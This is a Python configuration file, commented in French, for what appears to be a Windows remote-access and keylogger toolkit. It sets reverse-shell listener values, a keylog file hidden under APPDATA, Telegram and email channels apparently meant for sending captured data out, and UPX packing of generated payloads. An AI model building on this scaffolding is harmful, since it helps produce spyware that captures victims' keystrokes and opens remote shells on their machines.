# core/config.py

import os
from pathlib import Path
from dotenv import load_dotenv

# 📦 Chargement des variables d'environnement (.env)
ENV_PATH = Path(__file__).resolve().parents[1] / ".env"
load_dotenv(dotenv_path=ENV_PATH)

# 🌐 Réseau - Reverse Shell
LHOST = os.getenv("LHOST", "127.0.0.1")
LPORT = int(os.getenv("LPORT", 4444))

# 📂 Dossiers de logs
DEFAULT_LOG_DIR = os.path.join(os.getenv("APPDATA") or "C:\\Users\\Public", "win_logs")
LOG_DIR = os.getenv("LOG_DIR", DEFAULT_LOG_DIR)
KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
DEBUG_LOG_FILE = os.path.join(LOG_DIR, "agent_debug.log")

# 🔐 Clés API
SHODAN_API_KEY = os.getenv("SHODAN_API_KEY", "")
ABUSEIPDB_API_KEY = os.getenv("ABUSEIPDB_API_KEY", "")
IPINFO_API_KEY = os.getenv("IPINFO_API_KEY", "")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")

# 🌐 Webhook / Telegram
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_SECRET_TOKEN = os.getenv("TELEGRAM_SECRET_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
BASE_WEBHOOK_URL = os.getenv("BASE_WEBHOOK_URL", "")

# 📧 Email
EMAIL_SENDER = os.getenv("EMAIL_SENDER", "")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "")
SMTP_SERVER = os.getenv("SMTP_SERVER", "")
SMTP_PORT = int(os.getenv("SMTP_PORT", 587))
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER", "")

# ⚙️ Options générales
USE_UPX = os.getenv("USE_UPX", "true").lower() == "true"
IS_PRIVATE = os.getenv("IS_PRIVATE", "true").lower() == "true"
DEBUG = os.getenv("DEBUG", "false").lower() == "true"
AUTO_DETECT_IP = os.getenv("AUTO_DETECT_IP", "false").lower() == "true"

# 🧠 Routes de modules
AGENT_PATH = os.path.join("agents", "windows", "agent_win.py")
WRAPPER_TEMPLATE = os.path.join("build", "template_wrapper.py")
WRAPPER_OUTPUT = os.path.join("build", "temp_wrapper.py")
PAYLOAD_OUTPUT_DIR = os.path.join("build", "output")
PAYLOAD_ICON = os.path.join("assets", "win_ico.ico")
UPX_PATH = os.getenv("UPX_PATH", r"C:\Tools\upx-5.0.2-win64\upx.exe")
